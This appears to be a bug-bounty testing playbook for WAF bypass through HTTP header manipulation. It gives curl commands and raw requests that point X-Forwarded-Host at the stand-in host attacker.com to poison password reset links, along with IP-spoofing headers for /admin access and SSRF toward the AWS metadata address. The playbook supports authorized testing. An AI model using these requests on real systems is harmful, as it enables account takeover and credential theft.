---
name: attack-waf-bypass
description: "WAF bypass via header manipulation, IP spoofing, and password reset poisoning — attacker-controlled headers to evade Web Application Firewalls"
category: "input-validation"
version: "1.0"
author: "bountyreper-official"
tags:
  - waf
  - bypass
  - headers
  - ssrf
  - open-redirect
  - password-reset
  - ip-spoofing
tech_stack:
  - web
cwe_ids:
  - CWE-918
  - CWE-807
  - CWE-441
chains_with:
  - attack-ssrf
  - attack-open-redirect
  - wstg-injection
prerequisites: []
severity_boost:
  attack-ssrf: "WAF bypass + SSRF = internal metadata exfiltration"
  attack-open-redirect: "WAF header trust + open redirect = phishing token theft"
---

# WAF Bypass via Header Manipulation

## Objective

Bypass Web Application Firewalls and reverse-proxy trust by manipulating HTTP headers that applications use to determine origin, client IP, or redirect targets. Primary vector is password reset poisoning, with secondary uses in IP restriction bypass and SSRF.

> **Attribution:** Advanced methodologies distilled from [KathanP19/HowToHunt — WAF_Bypasses](https://github.com/KathanP19/HowToHunt/tree/master/WAF_Bypasses) by Virdoex_hunter and remonsec. Licensed GPL-3.0. Enhanced and adapted for BountyReper.

## Testing Methodology

### Phase 1: Header Trust Discovery

Identify which headers the application trusts for security decisions:

```bash
# Test Host/Origin trust (password reset poisoning)
curl -s -H "X-Forwarded-Host: attacker.com" \
     -H "Host: victim.com" \
     -X POST https://target.com/reset-password \
     -d "email=victim@victim.com" -D- | grep -i "attacker"

# IP spoof bypass (admin/internal endpoints)
for hdr in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "Client-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1"; do
  echo "Testing $hdr"
  curl -s -H "$hdr" https://target.com/admin -o /dev/null -w "%{http_code} $hdr\n"
done
```

Full header wordlist to test (from HowToHunt):

```
X-Forwarded-Host, X-Forwarded-Port, X-Forwarded-Scheme, X-Forwarded-For,
X-Real-IP, X-Client-IP, Client-IP, X-Originating-IP, X-Remote-IP, X-Remote-Addr,
X-Host, X-Forwarded-Server, X-Forwarded-By, Base-Url, Http-Url, Proxy-Url,
X-Original-URL, X-Rewrite-URL, X-Original-Remote-Addr, Referer, Origin
```

### Phase 2: Password Reset Poisoning

```http
POST /reset-password HTTP/1.1
Host: victim-site.com
X-Forwarded-Host: attacker.com
X-Forwarded-For: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

email=victim@victim.com
```

If vulnerable, reset link becomes `https://attacker.com/reset?token=...` — victim visits attacker domain, token stolen.

Verify with collaborator:
```bash
# Use Burp Collaborator or webhook.site as attacker.com, check for token callback
```

### Phase 3: Other Exploitation Paths

**IP Restriction Bypass:**
```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 192.168.1.1
```
If `192.168.1.1` is whitelisted internal IP and WAF trusts header, access granted.

**Open Redirect via Header:**
```http
GET /login?redirect=https://victim.com HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
Check if victim redirected to `attacker.com`.

**SSRF via Header Injection:**
```http
GET /api/fetch HTTP/1.1
Host: target.com
X-Forwarded-For: 169.254.169.254
```
If backend fetches using header value, may leak AWS metadata (`http://169.254.169.254/latest/meta-data/`).

## What Constitutes a Finding

| Condition | Severity |
|-----------|----------|
| Password reset token sent to attacker domain | Critical (P1) |
| Admin/internal access via spoofed IP header | High (P2) |
| Open redirect via header manipulation | Medium (P3) |
| SSRF via header to internal metadata | Critical (P1) |
| WAF bypassed but no data impact | Low (P4) |

## Evidence Requirements

- Request with manipulated header
- Response showing header was trusted (reset link to attacker, 200 on admin, redirect to attacker, or metadata leak)
- Collaborator/webhook log or PoC HTML

## Tools

- `curl` with custom headers
- Burp Collaborator / webhook.site
- `attack_script` for automation

## References

- [HowToHunt — WAF Bypass Using Headers](https://github.com/KathanP19/HowToHunt/tree/master/WAF_Bypasses)
- [PortSwigger: Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)
